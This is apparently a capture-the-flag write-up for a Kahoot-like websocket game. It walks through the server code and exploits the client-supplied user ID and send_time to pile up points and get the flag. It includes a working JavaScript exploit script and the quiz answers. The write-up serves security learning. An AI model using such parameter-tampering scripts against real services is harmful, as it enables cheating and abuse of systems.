## Solve Process
This is a website which makes use of websocket. Upon entering the website, we are greeted with this kahoot rip off.
![image110](/static/writeups/photos/image110.png) 

We take a look at the source code to check what the goal of the challenge was. It seems that the goal of the challenge is to get **\>= 10000 points (since there are 10 questions)**
```javascript
sock.send(b64encode(json.dumps({
    'scores': scores,
    'end': True,
    'message': f'omg congrats, swiftie!!! {flag}'
    if get_score(scores, room_id, data['id']) >= 1000 * len(kahoot['questions'])
    else 'sucks to suck broooooooo'
}).encode()))
```

The following is how points are awarded. A base of 1000 points is awarded, but that score is reduced over time by 50 each second, to a maximum of 500 points reduction.
```python
if data['answer'] == q['answer']:
    edit_score(scores, room_id, data['id'],
        get_score(scores, room_id, data['id']) + 1000 +
        max((send_time - recv_time) * 50, -500)
    )
```

From the following lines, we can see that the send\_time and answer is both sent from the client. What if we just set the send a send\_time greater than that of recv\_time, such that **max((send\_time-recv\_time) \* 50,-500)** is positive? That theoretically would get us enough points. 
```python
data = sock.receive()
data = json.loads(b64decode(data).decode())

send_time = data['send_time']
recv_time = time()
```

Unfortunately, this line of code prevents us from sending a send\_time that is greater than the current attack. I’ve seen people do a timing attack, due to the fact that **recv\_time** is generated **before this time()** is generated, so it is theoretically possible to get send\_time to be slightly greater than recv\_time. 
```python
if (scores := get_room_scores(room_id)) is not None and send_time >= time():
    sock.send(b64encode(json.dumps({
        'scores': scores,
        'end': True,
        'message': '???'
    }).encode()))
    return
```

Taking a closer look at edit\_score and get\_score function, we can see that it takes both a **room\_id** and a **uid**. Both the **uid** and **room\_id** are sent by the client. The UID is generated randomly on the front end, and presumably meant to prevent users from simply refreshing a room to earn more points.
```python
def edit_score(scores, room_id, uid, new_score):
    for i, score_data in enumerate(scores):
        if score_data[1] == uid:
            scores[i][2] = new_score
            return scores

    all_scores.append([room_id, uid, new_score])
    scores.append(all_scores[-1])
    return scores

...
def get_score(scores, room_id, uid):
    for score_data in scores:
        if score_data[0] == room_id and score_data[1] == uid:
            return score_data[2]

    return 0
```

**However**, since we can control the UID, what if we just manually set the UID to be the same as that of the previous game’s UID, to add to the score of the previous game? This is the approach we will be using.

```python
if i == 0:
    edit_score(scores, room_id, data['id'], 0)
```
One small problem we encounter is that the corresponding **room\_id and uid score** is reset to 0 each time we connect to the socket.

Since the server uses the uid we issue for the current round, we simply need to send a random uid for the first round, and for subsequent rounds, set the uid to be that of the one we choose.

## Code  
First, play the kaboot game normally. Using the uid given for that game, connect to the socket and run the game again. In the first round a random uid should be send  
```javascript
let i \= 0;  
newsocket2 \= new WebSocket(\`wss://${location.href.split('//', 2)\[1\]}\`);  
let answers \= \[  
    1,3,1,1,3,3,2,3,2,4  
\]  
newsocket2.addEventListener('message', async e \=\> {  
    const text \= await e.data.text();  
  i\++;  
  if (i \== 1) {  
    return  
  }

  console.log(text);  
  const epochTimeSeconds \= Date.now() / 1000;  
  if (i \== 2) var newid \= "fun"  
  else var newid \= '6d0cfecb-b0e3-c5eb-adf2-cde7580b16c1'  
  console.log(JSON.stringify({  
        id: newid,  
        answer: answers\[i\-2\],  
        send\_time: epochTimeSeconds\+1  
    }))  
  newsocket2.send(btoa(JSON.stringify({  
        id: newid,  
        answer: answers\[i\-2\],  
        send\_time: epochTimeSeconds\+1  
    })));  
});
```
![image118](/static/writeups/photos/image118.png)  
The last message sent is the base64 encoded data, which should contain our flag  
![image119](/static/writeups/photos/image119.png)

## Extra Notes  
The websocket only allows 1 connection at a time. Ensure you finish the kaboot game first before you connect to the websocket again.
